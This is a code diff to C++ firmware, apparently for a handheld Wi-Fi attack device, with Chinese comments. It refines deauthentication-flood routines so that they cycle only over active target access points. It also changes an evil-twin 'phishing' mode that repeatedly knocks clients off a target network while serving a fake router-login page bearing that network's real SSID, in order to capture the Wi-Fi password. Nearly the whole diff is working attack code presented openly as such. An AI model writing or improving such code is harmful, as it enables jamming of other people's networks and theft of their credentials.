@@ -3990,6 +3990,10 @@ void updateSmartTargets() {
   } else {  // 扫描失败
     // 恢复之前的扫描结果
     scan_results = std::move(backup_results);
+    // 恢复所有目标的活跃状态
+    for (auto& target : smartTargets) {
+      target.active = true;
+    }
     Serial.println("Scan failed, restored previous results");
   }
 }
@@ -4072,17 +4076,18 @@ if (smartTargets.empty()) {
 }
      // 攻击目标
     for (const auto& target : smartTargets) {
-  // 不管是否活跃都进行攻击
-  wext_set_channel(WLAN0_NAME, target.channel);
-  
-  // 使用 burst 版本减少逐帧调用开销
-  sendDeauthBurstToBssid(target.bssid, 3, packetCount, 5);
-          if (packetCount >= 500) {
+      if (target.active) {  // 只攻击活跃目标
+        wext_set_channel(WLAN0_NAME, target.channel);
+        
+        // 使用 burst 版本减少逐帧调用开销
+        sendDeauthBurstToBssid(target.bssid, 3, packetCount, 5);
+        if (packetCount >= 500) {
           digitalWrite(LED_R, HIGH);
           delay(50);
           digitalWrite(LED_R, LOW);
           packetCount = 0;
         }
+      }
     
     // 检查按钮状态
     if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
@@ -4163,19 +4168,30 @@ void AutoMulti() {
     }
     int packetCount = 0;
     if (!smartTargets.empty()) {
+      // 跳过非活跃目标
+      while (currentTargetIndex < smartTargets.size() && !smartTargets[currentTargetIndex].active) {
+        currentTargetIndex++;
+      }
       if (currentTargetIndex >= smartTargets.size()) {
         currentTargetIndex = 0;
+        // 再次跳过非活跃目标
+        while (currentTargetIndex < smartTargets.size() && !smartTargets[currentTargetIndex].active) {
+          currentTargetIndex++;
+        }
       }
-      const auto& target = smartTargets[currentTargetIndex];
-      wext_set_channel(WLAN0_NAME, target.channel);
-      sendFixedReasonDeauthBurst(target.bssid, 0, 5, packetCount, 5);
-      if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
-        digitalWrite(LED_R, HIGH);
-        delay(50);
-        digitalWrite(LED_R, LOW);
-        packetCount = 0;
+      
+      if (currentTargetIndex < smartTargets.size()) {
+        const auto& target = smartTargets[currentTargetIndex];
+        wext_set_channel(WLAN0_NAME, target.channel);
+        sendFixedReasonDeauthBurst(target.bssid, 0, 5, packetCount, 5);
+        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
+          digitalWrite(LED_R, HIGH);
+          delay(50);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
+        currentTargetIndex = (currentTargetIndex + 1) % smartTargets.size();
       }
-      currentTargetIndex = (currentTargetIndex + 1) % smartTargets.size();
     }
     // 优化：减少无效延时
     // delay(10); // 可根据实际情况调整或去除
@@ -4222,7 +4238,9 @@ void All() {
     // 按信道分组，减少频繁切换信道
     channelBucketsCache.clearBuckets();
     for (const auto &t : smartTargets) {
-      channelBucketsCache.add(t.channel, t.bssid);
+      if (t.active) {  // 只攻击活跃目标
+        channelBucketsCache.add(t.channel, t.bssid);
+      }
     }
     
     int packetCount = 0;
@@ -5307,7 +5325,7 @@ void StableAutoMulti() {
   // 初始化目标列表（与 AutoMulti 一致）
   if (smartTargets.empty() && !SelectedVector.empty()) {
     for (int selectedIndex : SelectedVector) {
-  if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
         TargetInfo target;
         memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
         target.channel = scan_results[selectedIndex].channel;
@@ -5369,7 +5387,9 @@ void StableAutoMulti() {
     // 按信道分组，逐信道轮询，减少切换（复用缓存）
     channelBucketsCache.clearBuckets();
     for (const auto &t : smartTargets) {
-      channelBucketsCache.add(t.channel, t.bssid);
+      if (t.active) {  // 只攻击活跃目标
+        channelBucketsCache.add(t.channel, t.bssid);
+      }
     }
 
     int packetCount = 0;
@@ -6145,10 +6165,8 @@ bool startWebTest() {
     lastPhishingBroadcastMs = nowInit;
     if (phishingHasTarget) {
       int dummy = 0;
-      // 预突发：各原因码发送数帧，帧间隔 5ms
-      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 1, 1, dummy, 5); }
-      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 4, 1, dummy, 5); }
-      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 16, 1, dummy, 5); }
+      // 预突发：使用与稳定自动多重攻击相同的发包逻辑
+      sendDeauthBurstToBssidUs(phishingTargetBSSID, 5, dummy, 250);
     }
     return true;
   } else {
@@ -6706,9 +6724,10 @@ void handleWebTestClient(WiFiClient& client) {
         break;
       case AP_WEB_ROUTER_AUTH:
       default: {
-        // 将模板中的 {SSID} 替换为实际SSID，避免前端JS动态获取
+        // 将模板中的 {SSID} 替换为目标WiFi的真实SSID，而不是固定的WEB_UI_SSID
         String page = FPSTR(WEB_AUTH2_HTML);
-        page.replace("{SSID}", String(WEB_UI_SSID));
+        String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
+        page.replace("{SSID}", targetSsid);
         header += "Content-Length: " + String(page.length()) + "\r\n";
         header += "Connection: close\r\n\r\n";
         client.print(header);
@@ -6783,7 +6802,8 @@ void sendWebTestPage(WiFiClient& client) {
     case AP_WEB_ROUTER_AUTH:
     default: {
       String page = FPSTR(WEB_AUTH2_HTML);
-      page.replace("{SSID}", String(WEB_UI_SSID));
+      String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
+      page.replace("{SSID}", targetSsid);
       client.print(page);
       break;
     }
@@ -7113,16 +7133,15 @@ void handleWebTest() {
     lastOkTime = currentTime;
   }
 
-  // 钓鱼期间：周期性发送去认证诱发（加强版）
-  // 频率提升：每 ~500ms 对目标发送小突发（原因码 1/4/16，各 3 帧，5ms间隔）
-  // 并且每 ~1s 发送一次广播去认证/解除关联，唤醒潜在STA
+  // 钓鱼期间：周期性发送去认证诱发（与稳定自动多重攻击相同的发包逻辑）
+  // 使用与稳定自动多重攻击完全相同的发包逻辑：sendDeauthBurstToBssidUs函数
+  // 按DEAUTH_REASONS[3] = {1, 4, 16}顺序循环发送，帧间隔250微秒
   if (phishingHasTarget) {
     unsigned long now = millis();
     if (now - lastPhishingDeauthMs >= 500UL) {
       int dummyCount = 0;
-      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 1, 1, dummyCount, 5); }
-      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 4, 1, dummyCount, 5); }
-      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 16, 1, dummyCount, 5); }
+      // 使用与稳定自动多重攻击相同的发包逻辑
+      sendDeauthBurstToBssidUs(phishingTargetBSSID, 3, dummyCount, 250);
       lastPhishingDeauthMs = now;
     }
     if (now - lastPhishingBroadcastMs >= 1000UL) {
